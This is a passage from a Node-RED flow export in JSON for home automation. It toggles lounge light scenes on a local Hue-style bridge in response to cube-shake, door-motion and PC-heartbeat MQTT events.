request","z":"51491686703cf8dc","name":"","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/{{id}}/state","tls":"","proxy":"","authType":"","x":890,"y":380,"wires":[["6357a0a15cb583c0"]]},{"id":"6357a0a15cb583c0","type":"debug","z":"51491686703cf8dc","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":1060,"y":380,"wires":[]},{"id":"13a79f81de4f4353","type":"function","z":"51491686703cf8dc","name":"All (state)","func":"var light1 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 1\n};\nvar light2 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 2\n};\nvar light3 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 3\n};\nvar light4 = {\n    payload: {\n        \"on\":msg.state,\n        \"bri\":255,\n        \"hue\":43680,\n        \"sat\":255,\n        \"transitiontime\":10\n    },\n    id: 7\n};\n// var light5 = {\n//     payload: {\n//         \"on\":msg.state,\n//         \"bri\":255,\n//         \"hue\":43680,\n//         \"sat\":255,\n//         \"transitiontime\":10\n//     },\n//     id: 8\n// };\nreturn [[light1, light2, light3, light4]];\n\n","outputs":1,"noerr":0,"x":640,"y":380,"wires":[["36b2f041b15a1599"]]},{"id":"a5a9dafa44a8edac","type":"function","z":"51491686703cf8dc","name":"Change Scene","func":"var lounge_lights_scene = \"lounge_lights_scene\";\nvar current_scene = flow.get(lounge_lights_scene);\nvar leila_light_msg = { payload: msg.payload, state: false };\n\nswitch (current_scene) {\n    case \"on\":\n        flow.set(lounge_lights_scene, \"leila_only\");\n        msg.state = false;\n        leila_light_msg.state = false;\n        break;\n    case \"leila_only\":\n        flow.set(lounge_lights_scene, \"off\");\n        leila_light_msg.state = true;\n        msg.state = false;\n        break;\n    case \"off\":\n        flow.set(lounge_lights_scene, \"on\");\n        leila_light_msg.state = true;\n        msg.state = true;\n        break;\n    default:\n        flow.set(lounge_lights_scene, \"on\");\n        leila_light_msg.state = true;\n        msg.state = true;\n        break;\n}\nreturn [msg, leila_light_msg];","outputs":2,"noerr":0,"initialize":"","finalize":"","libs":[],"x":440,"y":380,"wires":[["13a79f81de4f4353"],["76d72445a06a72bf"]]},{"id":"1d8452374e84891c","type":"mqtt in","z":"51491686703cf8dc","name":"/device/cube1/event","topic":"/device/cube1/event","qos":"2","datatype":"json","broker":"627df8f806a8df74","inputs":0,"x":710,"y":40,"wires":[["b6744533af6a7068"]]},{"id":"b98748ef81b181b2","type":"mqtt in","z":"51491686703cf8dc","name":"","topic":"/device/motion/door/event","qos":"2","datatype":"json","broker":"627df8f806a8df74","inputs":0,"x":130,"y":760,"wires":[[]]},{"id":"587bbb99d1c9ba8c","type":"inject","z":"51491686703cf8dc","name":"Initialise","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":true,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":520,"y":540,"wires":[[]]},{"id":"76d72445a06a72bf","type":"function","z":"51491686703cf8dc","name":"Leila Light","func":"msg.payload = {\n    \"on\":msg.state,\n    \"bri\":255,\n    \"hue\":43680,\n    \"sat\":255,\n    \"transitiontime\":10\n};\nmsg.id = 8;\nreturn msg;","outputs":1,"noerr":0,"x":640,"y":420,"wires":[["36b2f041b15a1599"]]},{"id":"f131aefa8055756d","type":"inject","z":"51491686703cf8dc","name":"ON","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":true,\"bri\":255,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":110,"y":140,"wires":[[]]},{"id":"b6744533af6a7068","type":"function","z":"51491686703cf8dc","name":"shake","func":"if (msg.payload.event !== \"shake\") {\n    return null;\n}\nreturn msg;","outputs":1,"noerr":0,"x":890,"y":40,"wires":[["1fd0729b6fde9dc6","142c0b60375b4fcd"]]},{"id":"1fd0729b6fde9dc6","type":"delay","z":"51491686703cf8dc","name":"","pauseType":"delay","timeout":"2","timeoutUnits":"seconds","rate":"1","nbRateUnits":"1","rateUnits":"second","randomFirst":"1","randomLast":"5","randomUnits":"seconds","drop":false,"outputs":1,"x":1020,"y":120,"wires":[["e1ef7fe6c233c2d6"]]},{"id":"828eca503914589f","type":"http request","z":"51491686703cf8dc","name":"Light above me State (1)","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/1/state","tls":"","proxy":"","authType":"","x":1410,"y":40,"wires":[[]]},{"id":"a3e3753776a13ed1","type":"http request","z":"51491686703cf8dc","name":"Light 2 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/2/state","tls":"","proxy":"","authType":"","x":1370,"y":100,"wires":[[]]},{"id":"40f626b9200a4a6a","type":"http request","z":"51491686703cf8dc","name":"Light 3 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/3/state","tls":"","proxy":"","authType":"","x":1370,"y":160,"wires":[[]]},{"id":"374593267b93df68","type":"http request","z":"51491686703cf8dc","name":"Light 7 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/7/state","tls":"","proxy":"","authType":"","x":1370,"y":220,"wires":[[]]},{"id":"b397f7bb4e17cb41","type":"http request","z":"51491686703cf8dc","name":"Light above Leila 8 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/8/state","tls":"","proxy":"","authType":"","x":1410,"y":280,"wires":[[]]},{"id":"e1ef7fe6c233c2d6","type":"function","z":"51491686703cf8dc","name":"ON","func":"msg.payload = \"{\\\"on\\\":true,\\\"bri\\\":255,\\\"hue\\\":43680,\\\"sat\\\":255,\\\"transitiontime\\\":10}\";\nreturn msg;","outputs":1,"noerr":0,"x":1170,"y":240,"wires":[["b397f7bb4e17cb41","374593267b93df68"]]},{"id":"142c0b60375b4fcd","type":"function","z":"51491686703cf8dc","name":"OFF","func":"msg.payload = \"{\\\"on\\\":false,\\\"bri\\\":255,\\\"hue\\\":43680,\\\"sat\\\":255,\\\"transitiontime\\\":10}\";\nreturn msg;","outputs":1,"noerr":0,"x":1170,"y":40,"wires":[["828eca503914589f","a3e3753776a13ed1","40f626b9200a4a6a","374593267b93df68","b397f7bb4e17cb41"]]},{"id":"6b9b65f048a8f0a3","type":"mqtt in","z":"984a3ce6dae99ed9","name":"","topic":"pc/heartbeat","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":150,"y":260,"wires":[["ef29c16320c3f993","3ae08a5fefca1a33","04e07c2c931997e2"]]},{"id":"ef29c16320c3f993","type":"trigger","z":"984a3ce6dae99ed9","name":"heartbeat timeout","op1":"ON","op2":"OFF","op1type":"str","op2type":"str","duration":"35","extend":true,"units":"s","reset":"","bytopic":"all","outputs":1,"x":470,"y":260,"wires":[["04e07c2c931997e2"]]},{"id":"f32eac8d7029b506","type":"mqtt in","z":"984a3ce6dae99ed9","name":"","topic":"pc/status/+","qos":"2","datatype":"auto","broker":"627df8f806a8df74","nl":false,"rap":false,"inputs":0,"x":150,"y":160,"wires":[["04e07c2c931997e2"]]},{"id":"3ae08a5fefca1a33","type":"link out","z":"984a3ce6dae99ed9","name":"PC Heartbeat","mode":"link","links":[],"x":395,"y":200,"wires":[]},{"id":"262054868c1e6940","type":"inject","z":"984a3ce6dae99ed9","name":"","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":160,"y":220,"wires":[["3ae08a5fefca1a33"]]},{"id":"04e07c2c931997e2","type":"debug","z":"984a3ce6dae99ed9","name":"PC Heartbeat stuff","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":750,"y":100,"wires":[]}]
